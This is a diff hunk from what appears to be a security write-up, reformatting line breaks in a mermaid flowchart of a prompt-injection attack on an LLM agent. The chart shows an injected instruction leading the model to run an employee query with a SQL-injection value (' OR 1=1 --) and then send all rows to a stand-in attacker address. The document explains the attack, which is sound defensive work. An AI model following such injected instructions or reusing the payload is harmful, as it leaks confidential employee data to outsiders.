@@ -218,10 +218,10 @@ legitimate use without context about what prompted the call.
 
 ```mermaid
 flowchart LR
-    A["User sends\ninjection payload"] --> B["LLM interprets\nas instructions"]
-    B --> C["query_employees\n(' OR 1=1 --)"]
-    C --> D["All rows returned\nincl. confidential"]
-    D --> E["send_message\n(attacker@evil.test)"]
+    A["User sends<br>injection payload"] --> B["LLM interprets<br>as instructions"]
+    B --> C["query_employees<br>(' OR 1=1 --)"]
+    C --> D["All rows returned<br>incl. confidential"]
+    D --> E["send_message<br>(attacker@evil.test)"]
     E --> F["Data exfiltrated"]
 
     style A fill:#b22222,color:#fff
